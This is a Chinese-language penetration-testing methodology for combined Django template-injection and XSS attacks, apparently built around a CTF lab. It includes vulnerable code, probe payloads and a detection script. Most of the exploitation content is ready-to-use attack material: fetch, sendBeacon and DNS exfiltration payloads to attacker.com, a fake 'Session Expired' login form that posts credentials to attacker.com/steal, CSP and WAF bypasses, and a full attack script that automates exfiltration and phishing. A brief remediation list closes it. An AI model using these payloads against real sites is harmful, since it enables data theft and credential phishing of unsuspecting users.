# Django SSTI+XSS 组合攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 Django 服务端模板注入（SSTI）与跨站脚本攻击（XSS）组合利用流程，帮助发现和利用模板引擎配置缺陷导致的复合漏洞。

## 1.2 适用范围

本文档适用于使用 Django 模板引擎且存在模板字符串拼接漏洞的 Web 应用，特别是：
- 用户输入直接拼接到模板字符串
- 模板上下文暴露敏感变量
- 无 CSP 保护或 CSP 配置宽松
- DEBUG 模式启用的应用

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

Django SSTI+XSS 组合漏洞是指攻击者同时利用：
1. **SSTI 漏洞**：用户输入被拼接到模板字符串，可访问模板上下文变量
2. **XSS 漏洞**：模板输出未进行 HTML 编码，可注入恶意脚本

**本质问题**：
- 用户输入直接拼接到 `engine.from_string()` 而非使用模板变量
- 模板上下文暴露敏感数据（如 FLAG、SECRET_KEY）
- 输出到浏览器时未进行 HTML 实体编码
- 缺少内容安全策略（CSP）保护

### 典型漏洞代码

**文件位置**：`/app/webapp/views.py:9`

```python
def greet(request):
    engine = engines["django"]
    # 危险：用户输入直接拼接到模板字符串
    template = engine.from_string("<html><body><h1>Hello, "+request.GET.get("name")+"</h1></body></html>")
    flag = open('/flag.txt').read()
    context = {
        'FLAG': flag  # 敏感数据暴露在模板上下文
    }
    return HttpResponse(template.render(context, request))
```

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-94 | 代码注入 |
| CWE-79 | XSS |
| CWE-1336 | 模板引擎不当使用 |
| CWE-200 | 敏感信息泄露 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 问候/欢迎页面 | `/greet/?name=xxx` | 用户名直接拼接到模板 |
| 个性化页面 | `/profile?user=xxx` | 用户名渲染到页面 |
| 搜索结果页 | `/search?q=xxx` | 搜索词反射输出 |
| 错误页面 | `/error?msg=xxx` | 错误消息渲染 |
| 通知/消息页面 | `/notice?id=xxx` | 通知内容动态渲染 |

## 2.3 漏洞发现方法

### 2.3.1 SSTI 探测

**步骤 1：基础数学运算测试**
```
GET /greet/?name={{7*7}}
# 如果返回 "Hello, 49"，存在 SSTI
```

**步骤 2：模板上下文变量探测**
```
GET /greet/?name={{config}}
GET /greet/?name={{request}}
GET /greet/?name={{FLAG}}
GET /greet/?name={{secret}}
```

**步骤 3：Django 特定对象探测**
```
GET /greet/?name={{config.SECRET_KEY}}
GET /greet/?name={{request.user}}
GET /greet/?name={{request.COOKIES}}
GET /greet/?name={{view}}
```

### 2.3.2 XSS 探测

**步骤 1：基础 XSS Payload 测试**
```
GET /greet/?name=<script>alert(1)</script>
# 检查响应中是否原样返回 payload
```

**步骤 2：事件处理器测试**
```
GET /greet/?name=<img src=x onerror=alert(1)>
GET /greet/?name=<svg onload=alert(1)>
```

**步骤 3：上下文分析**
```
# HTML 上下文
GET /greet/?name=<h1>test</h1>

# 属性上下文
GET /greet/?name="onmouseover="alert(1)

# JavaScript 上下文
GET /greet/?name=';alert(1);//
```

### 2.3.3 组合漏洞确认

**确认 SSTI 和 XSS 同时存在**：
```
# 测试 1：SSTI 提取数据
GET /greet/?name={{FLAG}}
# 响应包含 FLAG 值

# 测试 2：XSS 执行脚本
GET /greet/?name=<script>alert(1)</script>
# 脚本在浏览器执行

# 测试 3：组合攻击
GET /greet/?name=<script>alert({{FLAG}})</script>
# 脚本执行且能访问模板变量
```

### 2.3.4 自动化检测脚本

```python
#!/usr/bin/env python3
"""
Django SSTI+XSS 组合漏洞检测脚本
"""

import requests
import sys

class DjangoSSTIXSSDetector:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []

    def detect_ssti(self):
        """检测 SSTI 漏洞"""
        test_cases = [
            ('{{7*7}}', '49'),
            ('{{config}}', 'Settings'),
            ('{{request}}', 'WSGIRequest'),
        ]

        for payload, expected in test_cases:
            url = f"{self.base_url}/greet/"
            response = self.session.get(url, params={'name': payload})
            
            if expected in response.text:
                self.vulnerabilities.append({
                    'type': 'SSTI',
                    'payload': payload,
                    'evidence': expected
                })
                return True
        return False

    def detect_xss(self):
        """检测 XSS 漏洞"""
        test_cases = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
        ]

        for payload in test_cases:
            url = f"{self.base_url}/greet/"
            response = self.session.get(url, params={'name': payload})
            
            if payload in response.text:
                # 检查 Content-Type
                content_type = response.headers.get('Content-Type', '')
                if 'text/html' in content_type:
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'payload': payload,
                        'context': 'HTML_BODY'
                    })
                    return True
        return False

    def detect_combo(self):
        """检测 SSTI+XSS 组合漏洞"""
        # 首先确认存在 FLAG 等敏感变量
        response = self.session.get(
            f"{self.base_url}/greet/",
            params={'name': '{{FLAG}}'}
        )
        
        import re
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if not flag_match:
            return False
        
        # 测试组合攻击
        combo_payload = f"<script>alert({{FLAG}})</script>"
        response = self.session.get(
            f"{self.base_url}/greet/",
            params={'name': combo_payload}
        )
        
        if '<script>' in response.text and 'FLAG' in response.text:
            self.vulnerabilities.append({
                'type': 'SSTI_XSS_COMBO',
                'payload': combo_payload,
                'impact': '敏感数据泄露 + 代码执行'
            })
            return True
        return False

    def run_detection(self):
        """运行完整检测"""
        print(f"[*] Scanning target: {self.base_url}")
        print()

        print("[*] Testing SSTI...")
        ssti_found = self.detect_ssti()
        print(f"    SSTI: {'[FOUND]' if ssti_found else '[NOT FOUND]'}")

        print("[*] Testing XSS...")
        xss_found = self.detect_xss()
        print(f"    XSS: {'[FOUND]' if xss_found else '[NOT FOUND]'}")

        print("[*] Testing SSTI+XSS Combo...")
        combo_found = self.detect_combo()
        print(f"    Combo: {'[FOUND]' if combo_found else '[NOT FOUND]'}")

        return self.vulnerabilities

def main():
    if len(sys.argv) < 2:
        print("Usage: python django_ssti_xss.py <target_url>")
        print("Example: python django_ssti_xss.py http://localhost:45121")
        sys.exit(1)

    detector = DjangoSSTIXSSDetector(sys.argv[1])
    detector.run_detection()

if __name__ == '__main__':
    main()
```

## 2.4 漏洞利用方法

### 2.4.1 敏感数据直接提取

**利用 SSTI 提取 FLAG**：
```
GET /greet/?name={{FLAG}}

响应：
Hello, FLAG{0d6abf1498911210d8a8ee29c20b5115e048723e08d8e07aa325a0799f9706a1}
```

**提取 Django 配置**：
```
GET /greet/?name={{config.SECRET_KEY}}

响应：
Hello, django-insecure-+@i)-n58!b8#v^)-+s!8$#l@7z%b^!52rrn4kl+^9-@riokc5r
```

**提取会话信息**：
```
GET /greet/?name={{request.session}}
GET /greet/?name={{request.COOKIES}}
```

### 2.4.2 SSTI+XSS 数据外带

**场景**：受害者访问恶意链接，攻击者远程获取敏感数据

**攻击步骤**：

1. **设置接收服务器**：
```bash
cd /tmp && python3 -m http.server 9999
```

2. **构造恶意 URL**：
```
GET /greet/?name=<script>fetch('http://attacker.com:9999/?flag={{FLAG}}').catch(e=>{})</script>
```

3. **诱导受害者访问**：
- 发送钓鱼邮件
- 在论坛/聊天室发布链接
- 使用短链接服务隐藏真实 URL

4. **接收外带数据**：
```
# 攻击者服务器日志：
::1 - - [27/Oct/2025 11:27:14] "GET /?flag=FLAG{0d6abf1498911210d8a8ee29c20b5115e048723e08d8e07aa325a0799f9706a1} HTTP/1.1" 200 -
```

### 2.4.3 凭证钓鱼攻击

**构造钓鱼页面**：
```
GET /greet/?name=<img src=x onerror="document.body.innerHTML='<h1>Session Expired</h1><form action=http://attacker.com/steal method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'">
```

**效果**：
- 页面被替换为伪造的登录表单
- 显示"Session Expired"提示诱导用户重新登录
- 用户输入的凭证发送到攻击者服务器

### 2.4.4 会话劫持（结合其他漏洞）

**场景**：如果应用同时存在认证绕过漏洞

```javascript
// 组合攻击脚本
<img src=x onerror="
  fetch('/dashboard', {
    headers: {'X-UserId': '10052'}
  })
  .then(r => r.text())
  .then(html => {
    const d = new DOMParser().parseFromString(html, 'text/html');
    const flag = d.querySelector('.flag').textContent;
    fetch('http://attacker.com/exfil?data=' + encodeURIComponent(flag));
  })
">
```

### 2.4.5 完整攻击链

**从 SSTI 到完全控制**：

```
阶段 1：信息收集
├── GET /greet/?name={{config}}         # 获取配置
├── GET /greet/?name={{FLAG}}           # 获取 FLAG
└── GET /greet/?name={{request.user}}   # 获取用户信息

阶段 2：数据外带
├── 设置接收服务器
├── 构造 XSS+ SSTI Payload
└── 诱导目标访问

阶段 3：持久化访问
├── 窃取会话 Cookie（如果无 HttpOnly）
├── 创建后门账户（如果有 admin 权限）
└── 植入 Webshell（如果能 RCE）
```

## 2.5 漏洞利用绕过方法

### 2.5.1 CSP 绕过

**场景**：应用配置了宽松 CSP

```
# 如果 CSP 允许 inline script
Content-Security-Policy: default-src 'self' 'unsafe-inline'

# 直接注入 script 标签
GET /greet/?name=<script>alert(1)</script>

# 如果 CSP 允许特定域名
Content-Security-Policy: default-src 'self' *.attacker.com

# 利用允许的域名
GET /greet/?name=<script src="//attacker.com/xss.js"></script>
```

### 2.5.2 过滤器绕过

**花括号过滤绕过**：
```
# URL 编码
GET /greet/?name=%7B%7BFLAG%7D%7D

# HTML 实体编码
GET /greet/?name=&#123;&#123;FLAG&#125;&#125;

# Unicode 编码
GET /greet/?name=\u007B\u007BFLAG\u007D\u007D
```

**标签过滤绕过**：
```
# 使用 SVG
GET /greet/?name=<svg onload=alert({{FLAG}})>

# 使用 IMG
GET /greet/?name=<img src=x onerror=alert({{FLAG}})>

# 使用 DETAILS
GET /greet/?name=<details open ontoggle=alert({{FLAG}})>
```

### 2.5.3 WAF 绕过

**分块注入**：
```
# 将 payload 分散到多个参数
GET /greet/?name1=<script>&name2=alert({{FLAG}})&name3=</script>

# 如果应用拼接多个参数
```

**大小写混合**：
```
GET /greet/?name=<ScRiPt>alert({{FLAG}})</ScRiPt>
```

**注释分割**：
```
GET /greet/?name=<scr<!--comment-->ipt>alert({{FLAG}})</scr<!--comment-->ipt>
```

### 2.5.4 无回显利用

**场景**：XSS 执行但无可见效果

```
# 使用 DNSLog 外带
GET /greet/?name=<img src=x onerror="fetch('http://{{FLAG}}.attacker.com')">

# 使用 Beacon API
GET /greet/?name=<script>navigator.sendBeacon('http://attacker.com', {{FLAG}})</script>

# 使用 Image 对象
GET /greet/?name=<img src="http://attacker.com/?data={{FLAG}}" style="display:none">
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 攻击类型 | Payload | 说明 |
|---------|---------|------|
| SSTI 数据提取 | `{{FLAG}}` | 提取模板上下文变量 |
| SSTI 配置泄露 | `{{config.SECRET_KEY}}` | 获取 SECRET_KEY |
| XSS 基础 | `<script>alert(1)</script>` | 基础探测 |
| XSS 事件处理器 | `<img src=x onerror=alert(1)>` | 绕过标签过滤 |
| 组合攻击 | `<script>alert({{FLAG}})</script>` | SSTI+XSS |
| 数据外带 | `<script>fetch('http://attacker.com/?flag={{FLAG}}')</script>` | 远程窃取 |
| 钓鱼攻击 | `<img src=x onerror="document.body.innerHTML='...form...'">` | 凭证窃取 |

## 3.2 检测清单

```
□ 测试 SSTI 基础 Payload（数学运算）
□ 测试模板上下文变量访问
□ 测试 XSS 基础 Payload
□ 测试不同上下文 XSS（HTML/属性/JS）
□ 测试 SSTI+XSS 组合攻击
□ 测试 CSP 配置
□ 测试数据外带可行性
□ 测试过滤器绕过
```

## 3.3 完整攻击脚本

```python
#!/usr/bin/env python3
"""
Django SSTI+XSS 组合攻击完整脚本
"""

import requests
import re
import sys

class DjangoSSTIXSSAttacker:
    def __init__(self, target_url, attacker_server):
        self.target_url = target_url
        self.attacker_server = attacker_server
        self.session = requests.Session()

    def extract_flag(self):
        """直接提取 FLAG"""
        response = self.session.get(
            f"{self.target_url}/greet/",
            params={'name': '{{FLAG}}'}
        )
        
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            return flag_match.group()
        return None

    def exfiltrate_data(self, data_expression):
        """使用 XSS 外带数据"""
        payload = f"<script>fetch('{self.attacker_server}/?data=' + encodeURIComponent({data_expression})).catch(e=>{{}})</script>"
        
        url = f"{self.target_url}/greet/"
        response = self.session.get(url, params={'name': payload})
        
        return response.status_code == 200

    def phishing_attack(self):
        """发起钓鱼攻击"""
        phishing_html = '''<h1>Session Expired</h1>
<form action="''' + self.attacker_server + '''/steal" method="POST">
    <input name="user" placeholder="Username">
    <input name="pass" type="password" placeholder="Password">
    <button>Login</button>
</form>'''

        payload = f'<img src=x onerror="document.body.innerHTML=\'{phishing_html}\'">'
        
        response = self.session.get(
            f"{self.target_url}/greet/",
            params={'name': payload}
        )
        
        return response.status_code == 200

    def run_full_attack(self):
        """执行完整攻击"""
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Attacker Server: {self.attacker_server}")
        print()

        # 阶段 1：提取 FLAG
        print("[*] Phase 1: Extracting FLAG...")
        flag = self.extract_flag()
        if flag:
            print(f"[+] FLAG: {flag}")
        else:
            print("[-] FLAG not found")

        # 阶段 2：数据外带
        print("\n[*] Phase 2: Data exfiltration...")
        if self.exfiltrate_data('{{FLAG}}'):
            print("[+] Data exfiltration payload sent")
            print(f"    Check your attacker server logs for results")

        # 阶段 3：钓鱼攻击
        print("\n[*] Phase 3: Phishing attack...")
        if self.phishing_attack():
            print("[+] Phishing payload deployed")
            print(f"    Credentials will be sent to {self.attacker_server}/steal")

        return flag

def main():
    if len(sys.argv) < 3:
        print("Usage: python django_attack.py <target_url> <attacker_server>")
        print("Example: python django_attack.py http://localhost:45121 http://attacker.com:9999")
        sys.exit(1)

    attacker = DjangoSSTIXSSAttacker(sys.argv[1], sys.argv[2])
    attacker.run_full_attack()

if __name__ == '__main__':
    main()
```

## 3.4 修复建议

1. **修复模板注入**：
   - 使用 `render()` 函数而非 `from_string()` 拼接
   - 将用户输入作为模板变量传递：`render(request, 'template.html', {'name': user_input})`
   - 避免在模板上下文中暴露敏感变量

2. **修复 XSS**：
   - 使用 Django 模板变量自动转义：`{{ name }}`
   - 启用 CSP：`Content-Security-Policy: default-src 'self'`
   - 设置 Cookie 为 HttpOnly

3. **安全配置**：
   - 关闭 DEBUG 模式
   - 移除模板上下文中的敏感数据
   - 使用环境变量存储密钥

